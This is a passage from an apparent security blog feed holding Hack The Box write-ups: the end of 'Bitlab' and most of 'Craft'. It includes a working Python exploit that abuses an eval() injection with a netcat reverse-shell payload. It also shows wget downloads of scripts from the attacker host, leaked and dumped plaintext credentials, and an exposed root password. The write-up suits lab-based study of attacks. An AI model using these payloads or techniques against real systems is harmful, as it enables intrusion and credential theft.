class="code"><pre><span class="line">EAX 00993E80 UNICODE &quot;-ssh root@gitlab.htb -pw &quot;Qf7]8YSV.wDNF*[7d?j&amp;eD4^&quot;&quot;</span><br><span class="line">EBX 00993DA0 ASCII &quot;-ssh root@gitlab.htb -pw &quot;Qf7]8YSV.wDNF*[7d?j&amp;eD4^&quot;&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/hackthebox/bitlab/29.png" alt=""><br>And we owned root !<br>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p><p>Previous Hack The Box write-up : <a href="/hack-the-box/craft/">Hack The Box - Craft</a><br>Next Hack The Box write-up : <a href="/hack-the-box/player/">Hack The Box - Player</a></p>]]></content:encoded>
      
      <comments>https://0xrick.github.io/hack-the-box/bitlab/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Hack The Box - Craft</title>
      <link>https://0xrick.github.io/hack-the-box/craft/</link>
      <guid>https://0xrick.github.io/hack-the-box/craft/</guid>
      <pubDate>Sat, 04 Jan 2020 03:00:00 GMT</pubDate>
      <description>
      
        My write-up / walkthrough for Craft from Hack The Box.
      
      </description>
      
      
      <content:encoded><![CDATA[<h1 id="Hack-The-Box-Craft"><a href="#Hack-The-Box-Craft" class="headerlink" title="Hack The Box - Craft"></a>Hack The Box - Craft</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hey guys, today Craft retired and here’s my write-up about it. It’s a medium rated Linux box and its ip is <code>10.10.10.110</code>, I added it to <code>/etc/hosts</code> as <code>craft.htb</code>. Let’s jump right in !</p><p><img src="/images/hackthebox/craft/0.png" alt=""></p><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with <code>nmap</code> to scan for open ports and services:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;craft# nmap -sV -sT -sC -o nmapinitial craft.htb</span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-01-03 13:41 EST</span><br><span class="line">Nmap scan report for craft.htb (10.10.10.110)</span><br><span class="line">Host is up (0.22s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22&#x2F;tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)</span><br><span class="line">|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)</span><br><span class="line">|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)</span><br><span class="line">443&#x2F;tcp open  ssl&#x2F;http nginx 1.15.8</span><br><span class="line">|_http-server-header: nginx&#x2F;1.15.8</span><br><span class="line">|_http-title: About</span><br><span class="line">| ssl-cert: Subject: commonName&#x3D;craft.htb&#x2F;organizationName&#x3D;Craft&#x2F;stateOrProvinceName&#x3D;NY&#x2F;countryName&#x3D;US</span><br><span class="line">| Not valid before: 2019-02-06T02:25:47</span><br><span class="line">|_Not valid after:  2020-06-20T02:25:47</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http&#x2F;1.1</span><br><span class="line">| tls-nextprotoneg: </span><br><span class="line">|_  http&#x2F;1.1</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 75.97 seconds</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;craft#</span><br></pre></td></tr></table></figure><p>We got <code>https</code> on port 443 and <code>ssh</code> on port 22.</p><h2 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a>Web Enumeration</h2><p>The home page was kinda empty, Only the about info and nothing else:<br><img src="/images/hackthebox/craft/1.png" alt=""><br>The navigation bar had two external links, one of them was to <code>https://api.craft.htb/api/</code> and the other one was to <code>https://gogs.craft.htb</code>:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"nav navbar-nav pull-right"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://api.craft.htb/api/"</span>&gt;</span>API<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://gogs.craft.htb/"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">border</span>=<span class="string">"0"</span> <span class="attr">alt</span>=<span class="string">"Git"</span> <span class="attr">src</span>=<span class="string">"/static/img/Git-Icon-Black.png"</span> <span class="attr">width</span>=<span class="string">"20"</span> <span class="attr">height</span>=<span class="string">"20"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><p>So I added both of <code>api.craft.htb</code> and <code>gogs.craft.htb</code> to <code>/etc/hosts</code> then I started checking them.<br><code>https://api.craft.htb/api</code>:<br><img src="/images/hackthebox/craft/2.png" alt=""></p><p>Here we can see the <code>API</code> endpoints and how to interact with them.<br>We’re interested in the authentication part for now, there are two endpoints, <code>/auth/check</code> which checks the validity of an authorization token and <code>/auth/login</code> which creates an authorization token provided valid credentials. </p><p><img src="/images/hackthebox/craft/3.png" alt=""></p><p><img src="/images/hackthebox/craft/4.png" alt=""></p><p><img src="/images/hackthebox/craft/5.png" alt=""><br>We don’t have credentials to authenticate so let’s keep enumerating.<br>Obviously <code>gogs.craft.htb</code> had <code>gogs</code> running:<br><img src="/images/hackthebox/craft/6.png" alt=""></p><p>The repository of the <code>API</code> source code was publicly accessible so I took a look at the code and the commits. </p><p><img src="/images/hackthebox/craft/7.png" alt=""></p><p><img src="/images/hackthebox/craft/8.png" alt=""></p><p><img src="/images/hackthebox/craft/9.png" alt=""><br>Dinesh’s commits <code>c414b16057</code> and <code>10e3ba4f0a</code> had some interesting stuff. First one had some code additions to <code>/brew/endpoints/brew.py</code> where user’s input is being passed to <code>eval()</code> without filtering:<br><img src="/images/hackthebox/craft/10.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@@ -38,9 +38,13 @@ class BrewCollection(Resource):</span></span><br><span class="line">         <span class="string">"""</span></span><br><span class="line"><span class="string">         Creates a new brew entry.</span></span><br><span class="line"><span class="string">         """</span></span><br><span class="line">-</span><br><span class="line">-        create_brew(request.json)</span><br><span class="line">-        <span class="keyword">return</span> <span class="literal">None</span>, <span class="number">201</span></span><br><span class="line">+</span><br><span class="line">+        <span class="comment"># make sure the ABV value is sane.</span></span><br><span class="line">+        <span class="keyword">if</span> eval(<span class="string">'%s &gt; 1'</span> % request.json[<span class="string">'abv'</span>]):</span><br><span class="line">+            <span class="keyword">return</span> <span class="string">"ABV must be a decimal value less than 1.0"</span>, <span class="number">400</span></span><br><span class="line">+        <span class="keyword">else</span>:</span><br><span class="line">+            create_brew(request.json)</span><br><span class="line">+            <span class="keyword">return</span> <span class="literal">None</span>, <span class="number">201</span></span><br><span class="line"><span class="meta"> @ns.route('/&lt;int:id&gt;')</span></span><br><span class="line"><span class="meta"> @api.response(404, 'Brew not found.')</span></span><br></pre></td></tr></table></figure><p>I took a look at the <code>API</code> documentation again to find in which request I can send the <code>abv</code> parameter:<br><img src="/images/hackthebox/craft/11.png" alt=""></p><p>As you can see we can send a <code>POST</code> request to <code>/brew</code> and inject our payload in the parameter <code>abv</code>, However we still need an authorization token to be able to interact with <code>/brew</code>, and we don’t have any credentials.<br>The other commit was a test script which had hardcoded credentials, exactly what we need:<br><img src="/images/hackthebox/craft/12.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+response = requests.get(<span class="string">'https://api.craft.htb/api/auth/login'</span>,  auth=(<span class="string">'dinesh'</span>, <span class="string">'4aUh0A8PbVJxgd'</span>), verify=<span class="literal">False</span>)</span><br><span class="line">+json_response = json.loads(response.text)</span><br><span class="line">+token =  json_response[<span class="string">'token'</span>]</span><br><span class="line">+</span><br><span class="line">+headers = &#123; <span class="string">'X-Craft-API-Token'</span>: token, <span class="string">'Content-Type'</span>: <span class="string">'application/json'</span>  &#125;</span><br><span class="line">+</span><br><span class="line">+<span class="comment"># make sure token is valid</span></span><br><span class="line">+response = requests.get(<span class="string">'https://api.craft.htb/api/auth/check'</span>, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line">+print(response.text)</span><br><span class="line">+</span><br></pre></td></tr></table></figure><p>I tested the credentials and they were valid:<br><img src="/images/hackthebox/craft/13.png" alt=""></p><p><img src="/images/hackthebox/craft/14.png" alt=""></p><h2 id="RCE-–-gt-Shell-on-Docker-Container"><a href="#RCE-–-gt-Shell-on-Docker-Container" class="headerlink" title="RCE –&gt; Shell on Docker Container"></a>RCE –&gt; Shell on Docker Container</h2><p>I wrote a small script to authenticate, grab the token, exploit the vulnerability and spawn a shell.<br><code>exploit.py</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3 </span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">GREEN = <span class="string">"\033[32m"</span></span><br><span class="line">YELLOW = <span class="string">"\033[93m"</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span><span class="params">()</span>:</span></span><br><span class="line">req = requests.get(<span class="string">'https://api.craft.htb/api/auth/login'</span>,  auth=(<span class="string">'dinesh'</span>, <span class="string">'4aUh0A8PbVJxgd'</span>), verify=<span class="literal">False</span>)</span><br><span class="line">response = req.json()</span><br><span class="line">token = response[<span class="string">'token'</span>]</span><br><span class="line"><span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(token, ip, port)</span>:</span></span><br><span class="line">tmp = &#123;&#125;</span><br><span class="line"></span><br><span class="line">tmp[<span class="string">'id'</span>] = <span class="number">0</span></span><br><span class="line">tmp[<span class="string">'name'</span>] = <span class="string">"pwned"</span></span><br><span class="line">tmp[<span class="string">'brewer'</span>] = <span class="string">"pwned"</span></span><br><span class="line">tmp[<span class="string">'style'</span>] = <span class="string">"pwned"</span></span><br><span class="line">tmp[<span class="string">'abv'</span>] = <span class="string">"__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &#123;&#125; &#123;&#125; &gt;/tmp/f')"</span>.format(ip,port)</span><br><span class="line"></span><br><span class="line">payload = json.dumps(tmp)</span><br><span class="line"></span><br><span class="line">print(YELLOW + <span class="string">"[+] Starting listener on port &#123;&#125;"</span>.format(port))</span><br><span class="line">Popen([<span class="string">"nc"</span>,<span class="string">"-lvnp"</span>,port])</span><br><span class="line"></span><br><span class="line">print(YELLOW + <span class="string">"[+] Sending payload"</span>)</span><br><span class="line">requests.post(<span class="string">'https://api.craft.htb/api/brew/'</span>, headers=&#123;<span class="string">'X-Craft-API-Token'</span>: token, <span class="string">'Content-Type'</span>: <span class="string">'application/json'</span>&#125;, data=payload, verify=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(argv) != <span class="number">3</span>:</span><br><span class="line">print(YELLOW + <span class="string">"[!] Usage: &#123;&#125; [IP] [PORT]"</span>.format(argv[<span class="number">0</span>]))</span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line">ip = argv[<span class="number">1</span>]</span><br><span class="line">port = argv[<span class="number">2</span>]</span><br><span class="line">print(YELLOW + <span class="string">"[+] Authenticating"</span>)</span><br><span class="line">token = get_token()</span><br><span class="line">print(GREEN + <span class="string">"[*] Token: &#123;&#125;"</span>.format(token))</span><br><span class="line">exploit(token, ip, port)</span><br></pre></td></tr></table></figure><p><img src="/images/hackthebox/craft/15.png" alt=""><br>Turns out that the application was hosted on a docker container and I didn’t get a shell on the actual host.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;opt&#x2F;app # cd &#x2F;</span><br><span class="line">&#x2F; # ls -la</span><br><span class="line">total 64</span><br><span class="line">drwxr-xr-x    1 root     root          4096 Feb 10  2019 .</span><br><span class="line">drwxr-xr-x    1 root     root          4096 Feb 10  2019 ..</span><br><span class="line">-rwxr-xr-x    1 root     root             0 Feb 10  2019 .dockerenv</span><br><span class="line">drwxr-xr-x    1 root     root          4096 Jan  3 17:20 bin</span><br><span class="line">drwxr-xr-x    5 root     root           340 Jan  3 14:58 dev</span><br><span class="line">drwxr-xr-x    1 root     root          4096 Feb 10  2019 etc</span><br><span class="line">drwxr-xr-x    2 root     root          4096 Jan 30  2019 home</span><br><span class="line">drwxr-xr-x    1 root     root          4096 Feb  6  2019 lib</span><br><span class="line">drwxr-xr-x    5 root     root          4096 Jan 30  2019 media</span><br><span class="line">drwxr-xr-x    2 root     root          4096 Jan 30  2019 mnt</span><br><span class="line">drwxr-xr-x    1 root     root          4096 Feb  9  2019 opt</span><br><span class="line">dr-xr-xr-x  238 root     root             0 Jan  3 14:58 proc</span><br><span class="line">drwx------    1 root     root          4096 Jan  3 15:16 root</span><br><span class="line">drwxr-xr-x    2 root     root          4096 Jan 30  2019 run</span><br><span class="line">drwxr-xr-x    2 root     root          4096 Jan 30  2019 sbin</span><br><span class="line">drwxr-xr-x    2 root     root          4096 Jan 30  2019 srv</span><br><span class="line">dr-xr-xr-x   13 root     root             0 Jan  3 14:58 sys</span><br><span class="line">drwxrwxrwt    1 root     root          4096 Jan  3 17:26 tmp</span><br><span class="line">drwxr-xr-x    1 root     root          4096 Feb  9  2019 usr</span><br><span class="line">drwxr-xr-x    1 root     root          4096 Jan 30  2019 var</span><br><span class="line">&#x2F; #</span><br></pre></td></tr></table></figure><h2 id="Gilfoyle’s-Gogs-Credentials-–-gt-SSH-Key-–-gt-SSH-as-Gilfoyle-–-gt-User-Flag"><a href="#Gilfoyle’s-Gogs-Credentials-–-gt-SSH-Key-–-gt-SSH-as-Gilfoyle-–-gt-User-Flag" class="headerlink" title="Gilfoyle’s Gogs Credentials –&gt; SSH Key –&gt; SSH as Gilfoyle –&gt; User Flag"></a>Gilfoyle’s Gogs Credentials –&gt; SSH Key –&gt; SSH as Gilfoyle –&gt; User Flag</h2><p>In <code>/opt/app</code> there was a python script called <code>dbtest.py</code>, It connects to the database and executes a <code>SQL</code> query:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">/opt/app <span class="comment"># ls -la</span></span><br><span class="line">total <span class="number">44</span></span><br><span class="line">drwxr-xr-x    <span class="number">5</span> root     root          <span class="number">4096</span> Jan  <span class="number">3</span> <span class="number">17</span>:<span class="number">28</span> .</span><br><span class="line">drwxr-xr-x    <span class="number">1</span> root     root          <span class="number">4096</span> Feb  <span class="number">9</span>  <span class="number">2019</span> ..</span><br><span class="line">drwxr-xr-x    <span class="number">8</span> root     root          <span class="number">4096</span> Feb  <span class="number">8</span>  <span class="number">2019</span> .git</span><br><span class="line">-rw-r--r--    <span class="number">1</span> root     root            <span class="number">18</span> Feb  <span class="number">7</span>  <span class="number">2019</span> .gitignore</span><br><span class="line">-rw-r--r--    <span class="number">1</span> root     root          <span class="number">1585</span> Feb  <span class="number">7</span>  <span class="number">2019</span> app.py</span><br><span class="line">drwxr-xr-x    <span class="number">5</span> root     root          <span class="number">4096</span> Feb  <span class="number">7</span>  <span class="number">2019</span> craft_api</span><br><span class="line">-rwxr-xr-x    <span class="number">1</span> root     root           <span class="number">673</span> Feb  <span class="number">8</span>  <span class="number">2019</span> dbtest.py</span><br><span class="line">drwxr-xr-x    <span class="number">2</span> root     root          <span class="number">4096</span> Feb  <span class="number">7</span>  <span class="number">2019</span> tests</span><br><span class="line">/opt/app <span class="comment"># cat dbtest.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"><span class="keyword">from</span> craft_api <span class="keyword">import</span> settings</span><br><span class="line"></span><br><span class="line"><span class="comment"># test connection to mysql database</span></span><br><span class="line"></span><br><span class="line">connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,</span><br><span class="line">                             user=settings.MYSQL_DATABASE_USER,</span><br><span class="line">                             password=settings.MYSQL_DATABASE_PASSWORD,</span><br><span class="line">                             db=settings.MYSQL_DATABASE_DB,</span><br><span class="line">                             cursorclass=pymysql.cursors.DictCursor)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line">    <span class="keyword">with</span> connection.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">        sql = <span class="string">"SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1"</span></span><br><span class="line">        cursor.execute(sql)</span><br><span class="line">        result = cursor.fetchone()</span><br><span class="line">        print(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    connection.close()</span><br><span class="line">/opt/app <span class="comment">#</span></span><br></pre></td></tr></table></figure><p>I copied the script and changed <code>result = cursor.fetchone()</code> to <code>result = cursor.fetchall()</code> and I changed the query to <code>SHOW TABLES</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"><span class="keyword">from</span> craft_api <span class="keyword">import</span> settings</span><br><span class="line"></span><br><span class="line"><span class="comment"># test connection to mysql database</span></span><br><span class="line"></span><br><span class="line">connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,</span><br><span class="line">                             user=settings.MYSQL_DATABASE_USER,</span><br><span class="line">                             password=settings.MYSQL_DATABASE_PASSWORD,</span><br><span class="line">                             db=settings.MYSQL_DATABASE_DB,</span><br><span class="line">                             cursorclass=pymysql.cursors.DictCursor)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line">    <span class="keyword">with</span> connection.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">        sql = <span class="string">"SHOW TABLES"</span></span><br><span class="line">        cursor.execute(sql)</span><br><span class="line">        result = cursor.fetchall()</span><br><span class="line">        print(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    connection.close()</span><br></pre></td></tr></table></figure><p>There were two tables, <code>user</code> and <code>brew</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;opt&#x2F;app # wget http:&#x2F;&#x2F;10.10.xx.xx&#x2F;db1.py</span><br><span class="line">Connecting to 10.10.xx.xx (10.10.xx.xx:80)</span><br><span class="line">db1.py               100% |********************************|   629  0:00:00 ETA</span><br><span class="line"></span><br><span class="line">&#x2F;opt&#x2F;app # python db1.py</span><br><span class="line">[&#123;&#39;Tables_in_craft&#39;: &#39;brew&#39;&#125;, &#123;&#39;Tables_in_craft&#39;: &#39;user&#39;&#125;]</span><br><span class="line">&#x2F;opt&#x2F;app # rm db1.py</span><br><span class="line">&#x2F;opt&#x2F;app #</span><br></pre></td></tr></table></figure><p>I changed the query to <code>SELECT * FROM user</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"><span class="keyword">from</span> craft_api <span class="keyword">import</span> settings</span><br><span class="line"></span><br><span class="line"><span class="comment"># test connection to mysql database</span></span><br><span class="line"></span><br><span class="line">connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,</span><br><span class="line">                             user=settings.MYSQL_DATABASE_USER,</span><br><span class="line">                             password=settings.MYSQL_DATABASE_PASSWORD,</span><br><span class="line">                             db=settings.MYSQL_DATABASE_DB,</span><br><span class="line">                             cursorclass=pymysql.cursors.DictCursor)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line">    <span class="keyword">with</span> connection.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">        sql = <span class="string">"SELECT * FROM user"</span></span><br><span class="line">        cursor.execute(sql)</span><br><span class="line">        result = cursor.fetchall()</span><br><span class="line">        print(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    connection.close()</span><br></pre></td></tr></table></figure><p>The table had all users credentials stored in plain text: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;opt&#x2F;app # wget http:&#x2F;&#x2F;10.10.xx.xx&#x2F;db2.py</span><br><span class="line">Connecting to 10.10.xx.xx (10.10.xx.xx:80)</span><br><span class="line">db2.py               100% |********************************|   636  0:00:00 ETA</span><br><span class="line"></span><br><span class="line">&#x2F;opt&#x2F;app # python db2.py</span><br><span class="line">[&#123;&#39;id&#39;: 1, &#39;username&#39;: &#39;dinesh&#39;, &#39;password&#39;: &#39;4aUh0A8PbVJxgd&#39;&#125;, &#123;&#39;id&#39;: 4, &#39;username&#39;: &#39;ebachman&#39;, &#39;password&#39;: &#39;llJ77D8QFkLPQB&#39;&#125;, &#123;&#39;id&#39;: 5, &#39;username&#39;: &#39;gilfoyle&#39;, &#39;password&#39;: &#39;ZEU3N8WNM2rh4T&#39;&#125;]</span><br><span class="line">&#x2F;opt&#x2F;app # rm db2.py</span><br><span class="line">&#x2F;opt&#x2F;app #</span><br></pre></td></tr></table></figure><p>Gilfoyle had a private repository called <code>craft-infra</code>:<br><img src="/images/hackthebox/craft/16.png" alt=""></p><p><img src="/images/hackthebox/craft/17.png" alt=""><br>He left his private <code>ssh</code> key in the repository:<br><img src="/images/hackthebox/craft/18.png" alt=""></p><p><img src="/images/hackthebox/craft/19.png" alt=""><br>When I tried to use the key it asked for password as it was encrypted, I tried his <code>gogs</code> password (<code>ZEU3N8WNM2rh4T</code>) and it worked:<br><img src="/images/hackthebox/craft/20.png" alt=""><br>We owned user.</p><h2 id="Vault-–-gt-One-Time-SSH-Password-–-gt-SSH-as-root-–-gt-Root-Flag"><a href="#Vault-–-gt-One-Time-SSH-Password-–-gt-SSH-as-root-–-gt-Root-Flag" class="headerlink" title="Vault –&gt; One-Time SSH Password –&gt; SSH as root –&gt; Root Flag"></a>Vault –&gt; One-Time SSH Password –&gt; SSH as root –&gt; Root Flag</h2><p>In Gilfoyle’s home directory there was a file called <code>.vault-token</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gilfoyle@craft:~$ ls -la</span><br><span class="line">total 44</span><br><span class="line">drwx------ 5 gilfoyle gilfoyle 4096 Jan  3 13:42 .</span><br><span class="line">drwxr-xr-x 3 root     root     4096 Feb  9  2019 ..</span><br><span class="line">-rw-r--r-- 1 gilfoyle gilfoyle  634 Feb  9  2019 .bashrc</span><br><span class="line">drwx------ 3 gilfoyle gilfoyle 4096 Feb  9  2019 .config</span><br><span class="line">drwx------ 2 gilfoyle gilfoyle 4096 Jan  3 